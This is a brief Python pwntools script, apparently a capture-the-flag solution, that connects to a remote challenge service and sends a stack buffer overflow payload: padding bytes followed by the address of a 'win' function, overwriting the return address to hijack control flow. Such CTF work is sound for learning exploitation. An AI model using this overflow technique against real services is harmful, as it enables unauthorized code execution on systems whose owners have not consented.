from pwn import *

r = remote("hello.ss2.ccit23.havce.it", 31349)

print(r.recvuntil("chiami? "))

exe = ELF("./hello")

r.sendline(b"A"*32 + b"B"*8 + p64(exe.sym.win))

r.interactive()

